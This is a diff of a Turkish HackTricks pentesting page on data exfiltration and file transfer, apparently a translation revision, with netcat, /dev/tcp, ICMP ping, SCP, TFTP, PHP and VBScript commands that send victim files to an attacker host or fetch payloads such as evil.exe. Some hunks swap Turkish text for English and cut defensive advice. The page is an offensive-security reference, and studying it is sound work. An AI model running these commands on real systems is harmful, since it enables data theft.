@@ -2,11 +2,11 @@
 
 <details>
 
-<summary><strong>AWS hackleme konusunda sıfırdan kahramana dönüşün</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong> ile öğrenin!</strong></summary>
+<summary><strong>htARTE (HackTricks AWS Red Team Expert) ile sıfırdan kahramana kadar AWS hacklemeyi öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
 HackTricks'ı desteklemenin diğer yolları:
 
-* **Şirketinizi HackTricks'te reklamını görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI'na**](https://github.com/sponsors/carlospolop) göz atın!
+* **Şirketinizi HackTricks'te reklamını görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI**]'na göz atın (https://github.com/sponsors/carlospolop)!
 * [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
 * [**PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
 * **Katılın** 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya bizi **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**'da takip edin.**
@@ -14,9 +14,9 @@ HackTricks'ı desteklemenin diğer yolları:
 
 </details>
 
-**Try Hard Güvenlik Grubu**
+**Try Hard Security Group**
 
-<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
 
 {% embed url="https://discord.gg/tryhardsecurity" %}
 
@@ -24,9 +24,9 @@ HackTricks'ı desteklemenin diğer yolları:
 
 ## Bilgi çıkarmak için genellikle izin verilen alan adları
 
-[https://lots-project.com/](https://lots-project.com/) adresini kontrol ederek kötüye kullanılabilecek genellikle izin verilen alan adlarını bulun
+Sıkça izin verilen alan adlarını kötüye kullanabileceğiniz alan adlarını bulmak için [https://lots-project.com/](https://lots-project.com/) adresini kontrol edin
 
-## Base64 Kopyala ve Yapıştır
+## Kopyala ve Yapıştır Base64
 
 **Linux**
 ```bash
@@ -163,7 +163,7 @@ ftp -n -v -s:ftp.txt
 ```
 ## SMB
 
-Sunucu olarak Kali
+Kali olarak sunucu
 ```bash
 kali_op1> impacket-smbserver -smb2support kali `pwd` # Share current directory
 kali_op2> smbserver.py -smb2support name /path/folder # Share a folder
@@ -194,13 +194,13 @@ Windows
 Exfiltration is the unauthorized transfer of data from a target system. There are various methods to exfiltrate data from a compromised system, including:
 
 1. **Email**: Sending data as email attachments to an external email address.
-2. **FTP**: Transferring data using the File Transfer Protocol to an external server.
+2. **FTP**: Transferring data to an external FTP server.
 3. **DNS**: Encoding data within DNS requests to leak information.
-4. **HTTP/HTTPS**: Sending data over HTTP or HTTPS to a remote server.
+4. **HTTP/HTTPS**: Sending data over HTTP or HTTPS protocols to a remote server.
 5. **Steganography**: Hiding data within images or other files to avoid detection.
-6. **Cloud Storage**: Uploading data to cloud storage services like Dropbox or Google Drive.
+6. **Cloud Storage**: Uploading data to cloud storage services for later retrieval.
 
-Exfiltration can be a critical phase in an attack, as it allows threat actors to steal sensitive information from a target organization. It is important for defenders to monitor and control outbound network traffic to detect and prevent exfiltration attempts.
+It is important for pentesters to understand these exfiltration methods in order to assess the security posture of a system and recommend appropriate countermeasures.
 ```bash
 CMD-Wind> \\10.10.14.14\path\to\exe
 CMD-Wind> net use z: \\10.10.14.14\test /user:test test #For SMB using credentials
@@ -210,13 +210,13 @@ WindPS-2> cd new_disk:
 ```
 ## SCP
 
-Saldırganın SSHd çalışıyor olmalıdır.
+Saldırganın SSHd çalışıyor olması gerekmektedir.
 ```bash
 scp <username>@<Attacker_IP>:<directory>/<filename>
 ```
 ## SSHFS
 
-Eğer kurbanın SSH'si varsa, saldırgan kurbanın dizinini saldırganın dizinine bağlayabilir.
+Eğer kurbanın SSH'si varsa, saldırgan kurbanın dizinini saldırgana bağlayabilir.
 ```bash
 sudo apt-get install sshfs
 sudo mkdir /mnt/sshfs
@@ -224,28 +224,28 @@ sudo sshfs -o allow_other,default_permissions <Target username>@<Target IP addre
 ```
 ## NC
 
-NC, veya Netcat, bir ağ aracıdır ve sıkça kullanılan bir exfiltration aracıdır. Ağ üzerinden veri transferi yapmak için kullanılır. Örneğin, bir hedef makineden veri çalmak veya bir hedef makineye veri göndermek için kullanılabilir. Ayrıca, bir geri kapı oluşturmak veya bir hedef makineye erişim sağlamak için de kullanılabilir.
+NC, or Netcat, is a versatile networking tool that can be used for exfiltration. It can create connections to remote systems, listen for incoming connections, and transfer data between systems. Netcat can be used to exfiltrate data over various protocols such as TCP or UDP. It is a powerful tool for both legitimate network administration tasks and unauthorized data exfiltration activities.
 ```bash
 nc -lvnp 4444 > new_file
 nc -vn <IP> 4444 < exfil_file
 ```
 ## /dev/tcp
 
-### Kurbanın dosyasını indirin
+### Kurbanın cihazından dosya indirme
 ```bash
 nc -lvnp 80 > file #Inside attacker
 cat /path/file > /dev/tcp/10.10.10.10/80 #Inside victim
 ```
-### Kurbanın cihazına dosya yükle
+### Dosyayı hedefe yükle
 ```bash
 nc -w5 -lvnp 80 < file_to_send.txt # Inside attacker
 # Inside victim
 exec 6< /dev/tcp/10.10.10.10/4444
 cat <&6 > file.txt
 ```
-Teşekkürler **@BinaryShadow\_**
-
 ## **ICMP**
+
+**ICMP (Internet Control Message Protocol)**, İnternet Protokolü (IP) üzerinden hata mesajlarını iletmek ve ağ cihazları arasında iletişimi sağlamak için kullanılan bir protokoldür. ICMP, ağ üzerindeki hataları ve durumları raporlamak için kullanılır. Bu protokol, ağ cihazları arasında bilgi alışverişi yapmak için kullanılan bir araçtır.
 ```bash
 # To exfiltrate the content of a file via pings you can do:
 xxd -p -c 4 /path/file/exfil | while read line; do ping -c 1 -p $line <IP attacker>; done
@@ -291,37 +291,15 @@ tftp -i <KALI-IP> get nc.exe
 ```
 ## PHP
 
-PHP ile bir dosyayı indirin:
+PHP'de bir oneliner ile bir dosya indirin:
 ```bash
 echo "<?php file_put_contents('nameOfFile', fopen('http://192.168.1.102/file', 'r')); ?>" > down2.php
 ```
 ## VBScript
 
-### VBScript Exfiltration Techniques
+### VBScript Exfiltration
 
-VBScript can be used to exfiltrate data from a compromised system. Below are some common techniques used for data exfiltration using VBScript:
-
-1. **HTTP Requests**: VBScript can be used to send HTTP requests to an external server controlled by the attacker. This can be used to exfiltrate data by sending it as part of the request parameters or body.
-
-2. **Email**: VBScript can also be used to send emails with the exfiltrated data as an attachment or within the email body. This can be done using SMTP protocols.
-
-3. **File Transfer**: VBScript can be used to transfer files from the compromised system to an external server using protocols like FTP or SMB.
-
-4. **DNS Requests**: VBScript can be used to make DNS requests to a malicious DNS server controlled by the attacker. Data can be exfiltrated by encoding it within the DNS requests.
-
-### Detection and Prevention
-
-To detect and prevent data exfiltration using VBScript, consider the following measures:
-
-- **Network Monitoring**: Monitor network traffic for any suspicious HTTP requests or unusual patterns that may indicate data exfiltration.
-
-- **Email Filtering**: Implement email filtering to detect and block any emails containing sensitive data leaving the network.
-
-- **File Integrity Monitoring**: Monitor file changes and transfers initiated by VBScript to detect unauthorized exfiltration of data.
-
-- **DNS Monitoring**: Monitor DNS requests for any unusual patterns or requests to known malicious DNS servers.
-
-By implementing these measures, organizations can enhance their security posture and protect against data exfiltration using VBScript.
+VBScript can be used to exfiltrate data from a compromised system. This can be achieved by writing the data to a file and then sending it to an external server using various methods such as HTTP POST requests or SMTP email. VBScript can also be used to compress the data before exfiltration to minimize the size of the transferred data.
 ```bash
 Attacker> python -m SimpleHTTPServer 80
 ```
@@ -359,14 +337,14 @@ cscript wget.vbs http://10.11.0.5/evil.exe evil.exe
 ```
 ## Debug.exe
 
-`debug.exe` programı sadece ikili dosyaların incelenmesine izin vermekle kalmaz, aynı zamanda **onları onaltılıktan yeniden oluşturma yeteneğine** sahiptir. Bu, bir ikili dosyanın onaltılık bir biçimini sağlayarak `debug.exe`nin ikili dosyayı oluşturabilmesi anlamına gelir. Bununla birlikte, debug.exe'nin **64 kb boyutundaki dosyaları birleştirme sınırı** olduğunu unutmamak önemlidir.
+`debug.exe` programı sadece ikili dosyaların incelenmesine izin vermekle kalmaz, aynı zamanda **onları onaltılıktan yeniden oluşturma yeteneğine** sahiptir. Bu, bir ikili dosyanın onaltılık bir biçimini sağlayarak `debug.exe`nin ikili dosyayı oluşturabileceği anlamına gelir. Bununla birlikte, debug.exe'nin **64 kb boyutundaki dosyaları birleştirme sınırı** olduğunu unutmamak önemlidir.
 ```bash
 # Reduce the size
 upx -9 nc.exe
 wine exe2bat.exe nc.exe nc.txt
 ```
 ```markdown
-Ardından metni windows-shell'e kopyalayıp nc.exe adında bir dosya oluşturulacaktır.
+Ardından metni windows-shell'e kopyalayıp yapıştırın ve nc.exe adında bir dosya oluşturulacaktır.
 
 * [https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html](https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html)
 
@@ -376,21 +354,21 @@ Ardından metni windows-shell'e kopyalayıp nc.exe adında bir dosya oluşturula
 
 **Try Hard Security Group**
 
-<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
 
 {% embed url="https://discord.gg/tryhardsecurity" %}
 
 <details>
 
-<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> ile sıfırdan kahramana kadar AWS hacklemeyi öğrenin!</summary>
+<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> ile sıfırdan kahraman olmaya kadar AWS hackleme öğrenin!</summary>
 
 HackTricks'i desteklemenin diğer yolları:
 
 * Şirketinizi HackTricks'te reklamını görmek veya HackTricks'i PDF olarak indirmek istiyorsanız [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
 * [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
-* Özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) olan [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'yi keşfedin
-* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın veya bizi Twitter'da 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)'ı takip edin.
-* Hacking püf noktalarınızı paylaşarak PR'lar göndererek [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.
+* Özel [**NFT'lerimizden oluşan**](https://opensea.io/collection/the-peass-family) [**The PEASS Family**](https://opensea.io/collection/the-peass-family) koleksiyonumuzu keşfedin
+* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın veya bizi Twitter'da 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live) takip edin.
+* Hacking püf noktalarınızı göndererek HackTricks ve HackTricks Cloud github depolarına PR göndererek paylaşın.
 
 </details>
 ```
